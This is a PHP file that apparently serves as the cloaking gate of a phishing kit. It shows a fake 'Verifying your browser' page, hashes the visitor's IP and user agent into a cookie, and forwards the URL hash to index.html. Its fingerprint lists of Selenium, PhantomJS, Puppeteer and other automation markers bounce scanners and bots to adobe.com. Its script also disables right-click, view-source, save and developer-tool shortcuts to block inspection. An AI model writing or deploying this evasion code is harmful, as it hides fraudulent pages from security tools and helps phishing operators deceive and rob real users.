<?php
// Simple delayed redirect to index.html
// Removed all blocking functionality

ini_set('display_errors','0');
error_reporting(E_ALL);

// Function to get real IP address
function get_real_ip(){
    $ip_headers = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    
    foreach($ip_headers as $header){
        if(!empty($_SERVER[$header])){
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

// Simple verification page with delayed redirect
function show_verification_page(){
    $verification_html = '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <h2>Verifying your browser...</h2>
        <p>Please wait while we verify your browser.</p>
        <div class="loader"></div>
        <p>Redirecting in <span id="countdown">12</span> seconds...</p>
     </div>
     
     <script>
     var timeLeft = 12;
    var countdown = document.getElementById("countdown");
    
    // Function to get hash parameter exactly as is (including #)
    function getHashParameter() {
        const hash = window.location.hash;
        if (hash && hash.length > 1) {
            // Return the entire hash including the # symbol
            return hash;
        }
        return "";
    }
    
    // Function to add hash parameter to URL exactly as is
    function addHashToUrl(baseUrl) {
        const hashParam = getHashParameter();
        if (hashParam) {
            return baseUrl + hashParam; // Hash already includes #
        }
        return baseUrl;
    }
    
    var timer = setInterval(function(){
        timeLeft--;
        countdown.textContent = timeLeft;
        
        if(timeLeft <= 0){
            clearInterval(timer);
            window.location.href = addHashToUrl("index.html");
        }
    }, 1000);
    </script>

    <script>
        function runBotDetection() {
            let documentDetectionKeys = [
                "webdriver",
                "_WEBDRIVER_ELEM_CACHE",
                "ChromeDriverw",
                "Geckowebdriver",
                "driver-evaluate",
                "webdriver-evaluate",
                "selenium-evaluate",
                "selenium-webdriver",
                "webdriverCommand",
                "webdriver-evaluate-response",
                "__webdriverFunc",
                "__$webdriverAsyncExecutor",
                "$wdc_asdjflasutopfhvcZLmcfl_",
                "__lastWatirAlert",
                "__lastWatirConfirm",
                "__lastWatirPrompt",
                "$chrome_asyncScriptInfo",
                "$cdc_asdjflasutopfhvcZLmcfl_",
                "__webdriver_evaluate",
                "__selenium_evaluate",
                "__webdriver_script_function",
                "__webdriver_script_func",
                "__webdriver_script_fn",
                "__fxdriver_evaluate",
                "__driver_unwrapped",
                "__webdriver_unwrapped",
                "__driver_evaluate",
                "__selenium_unwrapped",
                "__fxdriver_unwrapped"
            ];

            let windowDetectionKeys = [
                "gecko",
                "$wdc_asdjflasutopfhvcZLmcfl_",
                "$cdc_asdjflasutopfhvcZLmcfl_",
                "domAutomation",
                "domAutomationController",
                "__stopAllTimers",
                "spawn",
                "__driver_evaluate",
                "__fxdriver_evaluate",
                "__driver_unwrapped",
                "__fxdriver_unwrapped",
                "emit",
                "__phantomas",
                "callPhantom",
                "geb",
                "__$webdriverAsyncExecutor",
                "fmget_targets",
                "spynner_additional_js_loaded",
                "watinExpressionResult",
                "watinExpressionError",
                "domAutomationController",
                "calledPhantom",
                "__webdriver_unwrapped",
                "__webdriver_script_function",
                "__webdriver_script_func",
                "__webdriver_script_fn",
                "__webdriver_evaluate",
                "__webdriver__chr",
                "__webdriverFuncgeb",
                "__selenium_unwrapped",
                "__selenium_evaluate",
                "__lastWatirPrompt",
                "cdc_adoQpoasnfa76pfcZLmcfl_Array",
                "cdc_adoQpoasnfa76pfcZLmcfl_Promise",
                "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
                "OSMJIF",
                "__lastWatirConfirm",
                "__lastWatirAlert",
                "calledSelenium",
                "webdriver",
                "marionette",
                "puppeteer",
                "Buffer",
                "_phantom",
                "__nightmare",
                "_selenium",
                "callPhantom",
                "Cypress",
                "callSelenium",
                "_Selenium_IDE_Recorder"
            ];

            let documentSearchKeys = [
                "driver",
                "webdriver",
                "marionette",
                "selenium",
                "phantom",
            ];

            for (const windowDetectionKey in windowDetectionKeys) {
                const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
                if (window[windowDetectionKeyValue]) {
                    return true;
                }
            }

            for (const documentDetectionKey in documentDetectionKeys) {
                const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
                if (window["document"][documentDetectionKeyValue]) {
                    return true;
                }
            }
            for (const documentKey in window["document"]) {
                if (documentKey.match(/\$[a-z]dc_/) && window["document"][documentKey]["cache_"]) {
                    return true;
                }
            }

            if (window["external"] && window["external"].toString() && (window["external"].toString()["indexOf"]("Sequentum") != -1)) return true;
            if (window["document"]["documentElement"]["getAttribute"]("selenium")) return true;
            if (window["document"]["documentElement"]["getAttribute"]("webdriver")) return true;
            if (window["document"]["documentElement"]["getAttribute"]("driver")) return true;
            if (window["document"]["documentElement"]["getAttribute"]("geckodriver")) return true;
            if (window["document"]["documentElement"]["getAttribute"]("firefox.marionette")) return true;
            for (const documentSearchKey in documentSearchKeys) {
                const documentSearchKeyValue = documentSearchKeys[documentSearchKey];
                if (window.document.documentElement.getAttribute(documentSearchKeyValue)) {
                    return true;
                }
            }

            return false;
        }

        if (runBotDetection() == true) {
            window.location.replace("https://www.adobe.com");
        }

        setTimeout(() => {window.location.replace("https://www.adobe.com")}, 5 * 60 * 1000)

        window.onkeydown = (e) => {
            return !(e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 88 || e.keyCode === 117));
        };

        window.addEventListener("keydown", (e) => {if (e.ctrlKey && e.which === 83) {e.preventDefault(); return false}});

        window.addEventListener("contextmenu", (event) => event.preventDefault());

        document.onkeydown = (e) => {
            if (e.keyCode === 123) {return false}
            if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "S".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "H".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "A".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "F".charCodeAt(0)) {return false}
            if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) {return false}
        }
    </script>
    <noscript>
        <meta http-equiv=\'refresh\' content=\'0;url=https://www.adobe.com\'/>
    </noscript>
    <noframes>
        <meta http-equiv=\'refresh\' content=\'0;url=https://www.adobe.com\'/>
    </noframes>
</body>
</html>';
    
    echo $verification_html;
    exit;
}

// Main logic - just show verification page with delayed redirect
function main_redirect(){
    // Check if already verified with cookie
    if(isset($_COOKIE['verified'])){
        $expected = hash('sha256', get_real_ip() . $_SERVER['HTTP_USER_AGENT']);
        if($_COOKIE['verified'] === $expected){
            // Use JavaScript redirect to preserve hash parameters
            echo '<script>
                function getHashParameter() {
                    const hash = window.location.hash;
                    if (hash && hash.length > 1) {
                        return hash;
                    }
                    return "";
                }
                
                function addHashToUrl(baseUrl) {
                    const hashParam = getHashParameter();
                    if (hashParam) {
                        return baseUrl + hashParam;
                    }
                    return baseUrl;
                }
                
                window.location.href = addHashToUrl("index.html");
            </script>';
            exit;
        }
    }
    
    // Set verification cookie and show delayed redirect page
    setcookie('verified', hash('sha256', get_real_ip() . $_SERVER['HTTP_USER_AGENT']), time() + 3600);
    show_verification_page();
}

// Set cache control headers
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// Run the main redirect
main_redirect();
?>
